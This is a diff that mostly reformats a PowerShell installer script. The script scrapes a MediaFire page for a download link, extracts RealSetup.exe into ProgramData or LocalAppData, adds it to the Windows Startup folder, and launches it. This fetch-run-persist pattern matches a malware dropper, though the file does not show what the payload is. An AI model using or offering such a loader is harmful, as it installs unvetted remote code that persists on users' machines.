@@ -6,15 +6,19 @@ $mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
 if ($isAdmin) {
-$targetPath = "$env:ProgramData\Global"
-if (-not (Test-Path $targetPath)) {
-New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
+    $targetPath = "$env:ProgramData\Global"
+
+    if (-not (Test-Path $targetPath)) {
+        New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
+    }
 }
-} else {
-$targetPath  = $env:LocalAppData
+else {
+    $targetPath = $env:LocalAppData
 }
-$zipPath  = Join-Path $targetPath $zipName
+
+$zipPath = Join-Path $targetPath $zipName
 $extractPath = Join-Path $targetPath "Real"
 
 # ==============================
@@ -66,9 +70,7 @@ $directUrl = $page.Links |
 
 # If that failed, search raw HTML
 if (-not $directUrl) {
-
     $pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
-
     $matches = [regex]::Matches($page.Content, $pattern)
 
     foreach ($match in $matches) {
@@ -148,7 +150,7 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 # ==============================
-# 8. Ink in Start Up
+# 8. Link in Start Up
 # ==============================
 
 $exePath = Join-Path $extractPath $exeName
@@ -158,11 +160,14 @@ if (-not (Test-Path $exePath)) {
 }
 
 $shortcutName = "Real.lnk"
+
 if ($isAdmin) {
-$startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-} else {
-$startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
+    $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 }
+else {
+    $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
+}
+
 $shortcutFile = Join-Path $startmenuPath $shortcutName
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
@@ -176,4 +181,4 @@ $Shortcut.Save()
 
 Write-Host "Starting $exePath"
 
-Start-Process ` -FilePath $exePath `
+Start-Process -FilePath $exePath
